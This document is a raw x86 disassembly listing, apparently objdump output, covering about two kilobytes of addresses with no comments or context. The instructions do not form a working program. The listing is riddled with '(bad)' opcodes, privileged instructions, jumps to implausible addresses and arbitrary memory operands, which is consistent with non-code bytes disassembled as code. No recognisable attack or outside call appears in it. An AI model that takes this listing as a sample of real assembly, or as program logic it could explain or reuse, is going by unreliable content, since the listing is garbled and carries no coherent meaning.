  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
